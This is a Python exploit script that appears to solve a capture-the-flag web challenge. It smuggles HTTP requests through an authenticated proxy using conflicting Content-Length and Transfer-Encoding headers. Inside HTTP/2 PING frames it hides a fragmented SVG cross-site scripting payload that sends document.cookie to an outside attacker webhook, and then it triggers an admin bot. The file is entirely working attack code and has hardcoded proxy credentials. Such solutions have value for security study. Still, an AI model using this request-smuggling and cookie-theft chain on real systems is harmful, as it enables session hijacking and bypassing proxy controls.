from pwn import *
from hpack import Encoder
import requests
from hyperframe import frame
import base64

BOT_URL = "http://84fd9a34bfcf4cd2a3d21aa65d4316e11.logo.infobahnc.tf:8000/"
PROXY_HOST = "logo.infobahnc.tf"
PROXY_PORT = 20002
PROXY_USERNAME = "logo"
PROXY_PASSWORD = "84fd9a34bfcf4cd2a3d21aa65d4316e1"
ATTACKER_WEBHOOK = "http://n.regularofvanilla.com/"

io = remote(PROXY_HOST, PROXY_PORT)

settings_stream = frame.SettingsFrame(0, {
    frame.SettingsFrame.MAX_CONCURRENT_STREAMS: 100,
    frame.SettingsFrame.INITIAL_WINDOW_SIZE: 0x10000,
    frame.SettingsFrame.ENABLE_PUSH: 0
}).serialize()

h2_payload = (
    b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + # Magic
    settings_stream 
)

payload = f"document.location.assign(`{ATTACKER_WEBHOOK}?`+document.cookie)"
payloads = [
    b"<svg>   ",
    b"<set    ",
    b" dur=1s ",
    b" onend=`",
    b"`;e=/*..",
    b"*/eval/*",
    b"*/;e(/*.",
    *[f"*/'{p}'+/*".encode() for p in payload],
    b"*/''/*..",
    b"*/) >   "
]

for payload in payloads:
    h2_payload += frame.PingFrame(0, payload).serialize()

enc = Encoder()
headers = [
    (':method', 'GET'),
    (':scheme', 'https'),
    (':path', f'/'),
    (':authority', 'example.com')
]
encoded = enc.encode(headers)
headers_stream = frame.HeadersFrame(1, encoded)
headers_stream.flags.add("END_STREAM")
headers_stream.flags.add("END_HEADERS")

h2_payload += headers_stream.serialize()

smuggled = f"""
HEAD / HTTP/1.1
Host: example.com
Content-Length: 0
""".strip().replace("\n", "\r\n").encode() + b"\r\n\r\n" + h2_payload

io.send((f"""
GET /aaa HTTP/1.1
Host: example.com
Content-Length: {len(smuggled) + 5}
Transfer-Encoding: Chunked
Authorization: Basic {base64.b64encode(f'{PROXY_USERNAME}:{PROXY_PASSWORD}'.encode()).decode()}

0

%s
""".strip().replace("\n", "\r\n")).encode() % smuggled)

print(io.recvall(timeout=3))

requests.post(BOT_URL)